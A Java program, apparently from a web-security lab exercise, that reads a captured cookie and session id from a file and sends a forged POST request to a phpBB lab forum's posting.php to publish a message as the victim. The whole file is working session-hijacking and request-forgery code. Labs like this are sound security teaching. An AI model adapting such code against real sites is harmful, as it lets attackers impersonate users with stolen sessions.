import java.io.*;
import java.net.*;

public class HTTPSimpleForge {

   public static void main(String[] args) throws IOException {
   try {
	int responseCode;
	InputStream responseIn=null;
	
	// Get cookie and sid from input file
	InputStream cns = new FileInputStream("task1input.txt");
	InputStreamReader cnsreader = new InputStreamReader(cns);
	BufferedReader buffread = new BufferedReader(cnsreader);
	String nextLine;
	String[] cookieAndSess = new String[]{"",""};
	int l = 0;
	while ((nextLine = buffread.readLine())!=null){
		cookieAndSess[l++] = nextLine;
	}
		
	// URL to be forged.
	URL url = new URL ("http://www.xsslabphpbb.com/posting.php");
	
	// URLConnection instance is created to further parameterize a 
	// resource request past what the state members of URL instance 
	// can represent.
	HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
	if (urlConn instanceof HttpURLConnection) {
		urlConn.setConnectTimeout(60000);
		urlConn.setReadTimeout(90000);
	}
		
	// addRequestProperty method is used to add HTTP Header Information.
	// Here we add User-Agent HTTP header to the forged HTTP packet.
	urlConn.setRequestMethod("POST");
	urlConn.addRequestProperty("Host","www.xsslabphpbb.com");
	urlConn.addRequestProperty("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11");
	urlConn.addRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	urlConn.addRequestProperty("Accept-Language","en-us,en;q=0.5");
	urlConn.addRequestProperty("Accept-Encoding","gzip,deflate");
	urlConn.addRequestProperty("Accept-Charset","ISO-8859-1,utf-8;q=0.7,*;q=0.7");
	urlConn.addRequestProperty("Keep-Alive","115");
	urlConn.addRequestProperty("Connection","keep-alive");	
	urlConn.addRequestProperty("Referer","http://www.xsslabphpbb.com/posting.php?mode=newtopic&f=1");
	urlConn.addRequestProperty("Cookie",cookieAndSess[0]);
	urlConn.addRequestProperty("Content-Type","application/x-www-form-urlencoded");
	//HTTP Post Data which includes the information to be sent to the server.
	String data="subject=XSS&addbbcode18=%23444444&addbbcode20=0&helpbox=Quote+text%3A+%5Bquote%5Dtext%5B%2Fquote%5D++%28alt%2Bq%29&message=A+forged+message&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid="+cookieAndSess[1]+"&f=1&post=Submit";	
	urlConn.addRequestProperty("Content-Length",""+data.length());
	// DoOutput flag of URL Connection should be set to true 
	// to send HTTP POST message.
	urlConn.setDoOutput(true);
		
	// OutputStreamWriter is used to write the HTTP POST data 
	// to the url connection.        	
        OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
        wr.write(data);
        wr.flush();

	// HttpURLConnection a subclass of URLConnection is returned by 
	// url.openConnection() since the url  is an http request.			
	if (urlConn instanceof HttpURLConnection) {
		HttpURLConnection httpConn = (HttpURLConnection) urlConn;
		
		// Contacts the web server and gets the status code from 
		// HTTP Response message.
		responseCode = httpConn.getResponseCode();
		System.out.println("Response Code = " + responseCode);
	
		// HTTP status code HTTP_OK means the response was 
		// received successfully.
		if (responseCode == HttpURLConnection.HTTP_OK) {

			// Get the input stream from url connection object.
			responseIn = urlConn.getInputStream();
			
			// Create an instance for BufferedReader 
			// to read the response line by line.
			BufferedReader buf_inp = new BufferedReader(
					new InputStreamReader(responseIn));
			String inputLine;
			while((inputLine = buf_inp.readLine())!=null) {
				System.out.println(inputLine);
			}
		}
	}
     } catch (MalformedURLException e) {
		e.printStackTrace();
     }
   }
}
